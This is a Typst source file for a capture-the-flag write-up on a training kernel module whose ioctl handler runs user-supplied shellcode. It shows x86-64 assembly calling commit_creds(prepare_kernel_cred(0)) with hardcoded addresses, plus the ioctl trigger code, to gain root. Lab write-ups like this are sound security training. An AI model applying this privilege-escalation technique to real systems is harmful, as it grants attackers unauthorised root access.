#metadata(
  (
    title: "Kernel Level 7",
    description: "Writeup for Kernel Level 7",
    date: "2026-01-01",
    order: 7,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project



#table(
  columns: (auto, 1fr),
  inset: 10pt,
  align: (right, left),
  [*Title*], [Kernel Shellcode Execution via ioctl],
  [*Date*], [2025-12-30],
  [*Description*],
  [Executing arbitrary code in kernel space by passing shellcode through an ioctl call.],
)

= Babykernel Level 7

== Introduction

This challenge is a variant of level 6, using `ioctl` instead of `write` to pass and trigger shellcode execution.

== Vulnerability Analysis

The `device_ioctl` handler for request `0x539` is designed to accept a pointer to a user-space structure containing shellcode. It copies this shellcode to a kernel buffer and executes it.

== Exploitation Steps

=== 1. Preparing Kernel Shellcode
The shellcode performs the standard `commit_creds(prepare_kernel_cred(0))` escalation:

```nasm
xor rdi, rdi
mov rax, 0xffffffff81089660 ; prepare_kernel_cred
call rax
mov rdi, rax
mov rax, 0xffffffff81089310 ; commit_creds
call rax
ret
```

=== 2. Defining the Structure
Typically, the module expects a structure like:
```c
struct payload {
    char shellcode[512];
};
```

=== 2. Triggering via ioctl
```c
struct payload p;
// ... fill p.shellcode ...
ioctl(fd, 0x539, &p);
```

=== 3. Escalation
The shellcode executes in kernel mode, calls `commit_creds`, and returns to user space where a root shell is spawned.

